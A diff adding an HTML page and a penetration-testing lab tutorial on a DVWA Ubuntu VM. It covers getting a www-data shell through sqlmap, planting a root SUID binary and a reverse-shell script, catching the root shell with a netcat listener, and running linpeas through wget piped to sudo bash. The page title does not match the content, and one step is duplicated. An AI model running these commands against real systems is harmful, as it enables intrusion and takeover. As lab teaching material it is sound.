@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Taming the Beast: Nginx, PHP and NAXSI Stack</title>
+  <!-- Import Silkscreen font for headings -->
+  <link href="https://fonts.googleapis.com/css2?family=Silkscreen&display=swap" rel="stylesheet">
+  <!-- Import Share Tech Mono font for paragraph text -->
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 1.5rem;
+      height: 100%;
+      min-height: 100%;
+      background-color: black;
+      color: #00ff00;
+      font-family: monospace, Courier, monospace;
+      box-sizing: border-box;
+      overflow: hidden !important; /* Hide scrollbars */
+    }
+
+    /* --- SURGICAL EDIT START --- */
+    /* Style the canvas to be a fixed, non-interactive background */
+    #matrix-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1; /* Lower layer */
+    }
+
+    .pulse-wrapper-outer {
+      position: relative;
+      max-width: 800px;
+      margin: 0 auto 3rem auto;
+      border-radius: 10px;
+      z-index: 2; /* Higher layer to be on top of the canvas */
+    }
+
+    /* The pulse animation keyframes and pseudo-elements have been removed. */
+
+    .pulse-wrapper {
+      position: relative;
+      background-color: rgba(0, 0, 0, 0.75); /* Slightly transparent background to see rain behind */
+      color: #00ff00;
+      font-size: 1.2em;
+      box-sizing: border-box;
+      border-radius: 15px;
+      border: 3px solid #3ad5fd; /* Kept the static border */
+      font-weight: bold;
+      padding: 24px;
+      font-family: 'Share Tech Mono', monospace;
+      max-width: 800px;
+      margin: 0;
+    }
+    /* --- SURGICAL EDIT END --- */
+
+    h2 {
+      font-family: 'Silkscreen', monospace, Courier, monospace;
+      margin: 0 0 1rem 0;
+      color: #00ff00;
+      text-align: left;
+    }
+
+    p {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1rem;
+      line-height: 1.5;
+      margin: 0.5rem 0;
+      padding: 0.1rem;
+      text-align: left;
+      color: #00ff00;
+    }
+
+    a {
+      color: #00ff00;
+      text-decoration: none;
+      word-break: break-word;
+      margin-top: 0.5rem;
+      display: inline-block;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- The new canvas element for the Matrix rain -->
+  <canvas id="matrix-canvas"></canvas>
+
+  <div class="pulse-wrapper-outer">
+    <div class="pulse-wrapper">
+      <h2>Hello everyone,</h2>
+      <p>
+        This step-by-step guide will walk you through escalating privileges from a www-data web shell to a full root shell on the DVWA Ubuntu VM. We will use a custom-compiled SUID binary to achieve this.
+
+The entire process is automated and guided by the dvwa-peas.sh script.
+      </p>
+    </div>
+  </div>
+
+  <!-- The new JavaScript for the Matrix rain effect -->
+  <script>
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+
+    // Set canvas to full screen
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    // Characters for the rain - Katakana, numbers, etc.
+    const katakana = 'ಕಖಗಘಙಚಛಜಝಞಟಠಡಢಣತಥದಧನಪಫಬಭಮಯರಱಲವಶಷಸಹಳೞಆಇಈಉಊಋೠಎಏಐಒಓಔಅಂಅಃ';
+    //const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+    const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const nums = '0123456789';
+    const characters = (katakana + latin + nums).split('');
+
+    const fontSize = 16;
+    const columns = Math.floor(canvas.width / fontSize);
+
+    // Create an array to track the y-position of each column's drop
+    const drops = [];
+    for (let i = 0; i < columns; i++) {
+      drops[i] = 1;
+    }
+
+    function draw() {
+      // Create the fading trail effect by drawing a semi-transparent black rectangle
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      // Set the color and font for the characters
+      ctx.fillStyle = '#00ff00'; // Classic green
+      ctx.font = fontSize + 'px monospace';
+
+      // Loop through each column
+      for (let i = 0; i < drops.length; i++) {
+        // Pick a random character
+        const text = characters[Math.floor(Math.random() * characters.length)];
+        // Draw the character at its current position
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        // Reset the drop to the top if it goes off-screen, with a random chance
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+
+        // Move the drop down for the next frame
+        drops[i]++;
+      }
+    }
+
+    // Start the animation loop (runs roughly 30 times per second)
+    setInterval(draw, 33);
+
+    // Optional: Handle window resize to make it responsive
+    window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        // Recalculate columns and reset drops if needed
+    });
+  </script>
+</body>
+</html>
+
+
+
+### Architecture Overview
+
+For this tutorial, we will use a classic two-machine virtualized setup:
+
+* **Ubuntu VM (The Target):** This machine will host our vulnerable web application. It will run a standard LAMP stack (Linux, Apache, MySQL, PHP), which is a very common configuration for web servers.
+* **Kali Linux VM (The Attacker):** This machine will be our attack platform. We will install a suite of professional penetration testing tools, including web scanners, brute-force tools, and exploitation frameworks.
+
+Both VMs will be on the same virtual network, allowing them to communicate with each other as if they were on a real-world local network.
+
+> **Note:** To ensure seamless communication between your host machine, the Kali VM, and the Ubuntu VM, a specific network configuration in VirtualBox is required.
+
+* **Bridged Adapter:** This mode connects your VMs directly to your physical network (e.g., your home Wi-Fi or Ethernet). Your router will assign each VM its own unique IP address, just like it does for your laptop or phone.
+
+#### VirtualBox Setup:
+
+1. In the VirtualBox settings for both your Kali and Ubuntu VMs, go to the **Network** tab.
+2. Set **Adapter 1** to be Attached to: **Bridged Adapter**.
+3. In the **Name** dropdown, select the network interface of your host machine that is connected to the internet (e.g., `en0`: Wi-Fi on a Mac, or your Ethernet card name on Windows/Linux).
+
+#### IP Addressing:
+
+On each VM, open a terminal and run the command:
+
+```bash
+ip a
+
+```
+
+Your VMs will now get IP addresses in the `10.x.x.x` range.
+
+For this guide, we will assume:
+
+* **Kali VM IP:** `10.0.103.69` *(example)*
+* **Ubuntu VM IP:** `10.0.103.99` *(example)*
+
+#### Connection Flow:
+
+```text
+   [Kali VM: 10.0.103.69] <--- Scans & Attacks ---> [Ubuntu VM: 10.0.103.99]
+           ▲                                                   ▲
+           | (SSH, Browser Access)                             | (SSH, Browser Access)
+           |                                                   |
+   +-------------------------------------------------------------------+
+   |                 VirtualBox Bridged Adapter Network                |
+   +-------------------------------------------------------------------+
+
+```
+
+---
+
+### Prerequisites
+
+You have two VMs running and networked together:
+
+* **Ubuntu VM:** With DVWA installed (using the `mysql50` setup from the previous lab).
+* **Kali Linux VM:** With prerequisite tools installed (using `kali_prereqs` from the previous lab).
+* You can get a basic `www-data` OS shell on the Ubuntu VM using `sqlmap` from your Kali VM.
+
+*(Refer to the comments for setting up both the VMs for SQLi attack using SQLMap)*
+
+---
+
+### Phase 1: Setting up the Exploit on the Ubuntu VM (Target)
+
+First, we need to create the necessary files on the Ubuntu server that will allow us to escalate our privileges later.
+
+#### Step 1: Run the SUID Setup Script
+
+On your Ubuntu VM, open a terminal and run the following command. This will download and execute the `dvwa-peas.sh` script to set up our exploit.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Download Link</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0rem;
+            height: 100%;
+            width: 100%;
+            background-color: black;
+            color: #00ff00; /* hacker green */
+            font-family: monospace, Courier, monospace;
+            overflow: hidden;   /* 🚀 hides scrollbars */
+        }
+        h5 {
+            margin-top: 0;
+            /* Remove extra space above */
+            margin-bottom: 0rem;
+        }
+        /* Hide scrollbar, allow scrolling */
+        body {
+        overflow: auto;
+        scrollbar-width: none; /* Firefox */
+        }
+        body::-webkit-scrollbar {
+        display: none; /* Chrome, Safari */
+        }
+    </style>
+</head>
+<body>
+    <h5>wget -O dvwa-peas.sh https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-peas.sh && sudo bash dvwa-peas.sh suid_setup
+    </h5>
+</body>
+</html>
+
+```
+
+#### Supported Platforms:
+
+* **VM OS:** `ubuntu-24.04.3-desktop-arm64`
+* **VM OS:** `ubuntu-25.04-desktop-arm64`
+* **Host OS:** Mac (Apple Silicon)
+
+#### What this does:
+
+1. Downloads the `dvwa-peas.sh` script.
+2. Prompts you to enter your Kali VM's IP address. This is crucial for the reverse shell to connect back to you.
+3. Creates and compiles a C program at `/opt/escalation_tools/escalate`.
+4. Sets the file's owner to `root` and adds the SUID bit. This means anyone who runs this file will run it with `root`'s permissions.
+5. Creates a reverse shell script at `/opt/escalation_tools/im_root.sh`.
+6. Adds a firewall rule (`ufw allow 1234/tcp`) on the Ubuntu VM to allow the reverse shell to connect out.
+
+Your Ubuntu VM is now primed for the exploit. **Do not reboot the VM from this point on.**
+
+---
+
+### Phase 2: Preparing the Attack on the Kali VM (Attacker)
+
+Now, we switch to the Kali VM to prepare our attack and catch the incoming root shell. This requires two separate terminals.
+
+#### Step 2: Start the Netcat Listener (Terminal 1)
+
+1. On your Kali VM, open a new terminal. This terminal will become your root shell.
+2. Start the Listener: Now, start netcat to listen on that port:
+```bash
+nc -lvnp 1234
+
+```
+
+
+3. Your terminal will now say `"listening on [any] 1234 ..."` and will wait patiently. Leave this terminal running and do not close it.
+
+#### Step 3: Obtain the www-data Shell (Terminal 2)
+
+1. On your Kali VM, open a second, separate terminal.
+2. **Get Your Session ID:** In your browser, log in to DVWA, set the security to **Low**, and get your `PHPSESSID` cookie from the browser's developer tools.
+3. **Run SQLmap:** Use the `dvwa-peas.sh` script with the `kali_get_os_shell` argument to get the initial `www-data` shell.
+
+Replace `<Your_DVWA_IP>` and `<Your_Fresh_PHPSESSID>` with your actual values.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Download Link</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0rem;
+            height: 100%;
+            width: 100%;
+            background-color: black;
+            color: #00ff00; /* hacker green */
+            font-family: monospace, Courier, monospace;
+            overflow: hidden;   /* 🚀 hides scrollbars */
+        }
+        h5 {
+            margin-top: 0;
+            /* Remove extra space above */
+            margin-bottom: 0rem;
+        }
+        pre, code {
+        white-space: pre-wrap;
+        word-break: break-word; /* Optional: breaks long words */
+        }
+        /* Hide scrollbar, allow scrolling */
+        body {
+        overflow: auto;
+        scrollbar-width: none; /* Firefox */
+        }
+        body::-webkit-scrollbar {
+        display: none; /* Chrome, Safari */
+        }
+    </style>
+</head>
+<body>
+    <pre><code>wget -O dvwa-peas.sh https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh && \ 
+DVWA_PHPSESSID=&lt;PHPSESSID&gt; DVWA_TARGET_URL="http://&lt;IP&gt;" sudo bash dvwa-peas.sh kali_get_os_shell
+    </code></pre>
+</body>
+</html>
+
+```
+
+`sqlmap` will now run and, if successful, will drop you into an interactive `os-shell>` prompt.
+
+---
+
+### Phase 3: Triggering the Exploit and Gaining Root
+
+This is the final step where you connect all the pieces.
+
+#### Step 4: Execute the Exploit
+
+In your `sqlmap` `os-shell>` prompt (Kali Terminal 2), do the following:
+
+1. Verify you are running as the `www-data` user:
+```text
+os-shell> whoami
+
+```
+
+
+*(You should see `www-data` as the output.)*
+2. Execute the SUID binary you created in Phase 1. This command will produce no output here:
+```text
+os-shell> /opt/escalation_tools/escalate
+
+```
+
+
+
+#### Step 5: Catch the Root Shell
+
+1. Immediately switch back to your netcat listener (Kali Terminal 1). You should see a `"connect to"` message, and you will have a new command prompt.
+2. To confirm your success, type the following command into the netcat terminal:
+```bash
+whoami
+
+```
+
+
+The output will be:
+```text
+root
+
+```
+
+
+
+Congratulations! You have successfully escalated your privileges to root.
+
+---
+
+### Phase 4: Post-Exploitation Reconnaissance (linPEAS)
+
+Now that you are root, the next step is to understand the machine more deeply and find other potential weaknesses or sensitive information. We'll use a powerful automated script called `linpeas.sh` for this.
+
+> **Note on linpeas.sh vs. unix-privesc-check:**
+> `linpeas.sh` (from the PEASS-ng suite) is the industry-standard tool for Linux privilege escalation checks today. It is actively maintained and searches for a much wider range of vulnerabilities than the older `unix-privesc-check` script. By using `linpeas.sh`, you are learning the tool you will most likely use in real-world penetration tests, while still fulfilling the tutorial's objective of scanning the host for issues.
+
+#### Step 6: Run the linPEAS Scanner
+
+In a new terminal on your Ubuntu VM, run the following command. This will download and run the scanner, showing you live output.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Download Link</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0rem;
+            height: 100%;
+            width: 100%;
+            background-color: black;
+            color: #00ff00; /* hacker green */
+            font-family: monospace, Courier, monospace;
+            overflow: hidden;   /* 🚀 hides scrollbars */
+        }
+        h5 {
+            margin-top: 0;
+            /* Remove extra space above */
+            margin-bottom: 0rem;
+        }
+        /* Hide scrollbar, allow scrolling */
+        body {
+        overflow: auto;
+        scrollbar-width: none; /* Firefox */
+        }
+        body::-webkit-scrollbar {
+        display: none; /* Chrome, Safari */
+        }
+    </style>
+</head>
+<body>
+    <h5>wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s peas_scan
+    </h5>
+</body>
+</html>
+
+```
+
+#### What this does:
+
+1. Downloads and executes the `peas_scan` function from the script.
+2. This function automatically downloads the latest `linpeas.sh` script.
+3. It runs the scan as `root`, showing live, color-coded output in your terminal.
+4. It saves a full copy of the report to `/tmp/linpeas_scan_report.txt`.
+
+#### Step 7: Analyze the Scan Report
+
+Once the scan finishes, the script will provide you with the command to view the report.
+
+1. Run the following command to open the report file in a searchable viewer:
+```bash
+less -R /tmp/linpeas_scan_report.txt
+
+```
+
+
+2. **Search for Warnings:** As the tutorial suggests, you can search for interesting findings. To search for the string `"WARNING"`, simply type `/WARNING` and press **Enter**. Press the **n** key to jump to the next match.
+
+Take some time to scroll through the report. This process of post-exploitation enumeration is a critical skill for any penetration tester.
+
+---
+
+### Phase 5: Post-Exploitation and Cleanup
+
+#### Step 8: Run a Host Scanner (Optional but Recommended)
+
+Now that you are root, you can run a scanner on the Ubuntu VM to find other potential misconfigurations.
+
+In a new terminal on your Ubuntu VM, run:
+
+```bash
+# Replace <script_url> with the actual URL
+wget -qO- <script_url> | sudo bash -s peas_scan
+
+```
+
+This downloads and runs `linpeas.sh`. It will display live output and save a full color-coded report to `/tmp/linpeas_scan_report.txt`.
+
+Review the report for interesting findings:
+
+```bash
+less -R /tmp/linpeas_scan_report.txt
+
+```
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Download Link</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0rem;
+            height: 100%;
+            width: 100%;
+            background-color: black;
+            //color: #00ff00; /* hacker green */
+            color: #3ad5fd;
+            font-family: monospace, Courier, monospace;
+            overflow: hidden;   /* 🚀 hides scrollbars */
+        }
+        body {
+            align-items: center;
+            justify-content: center;
+        }
+        h3 {
+            margin-top: 0;
+            /* Remove extra space above */
+            margin-bottom: 0rem;
+        }
+        /* Hide scrollbar, allow scrolling */
+        body {
+        overflow: auto;
+        scrollbar-width: none; /* Firefox */
+        }
+        body::-webkit-scrollbar {
+        display: none; /* Chrome, Safari */
+        }
+    </style>
+</head>
+<body>
+    <h3>                    Happy Pwning ☺︎
+    </h3>
+</body>
+</html>
+```
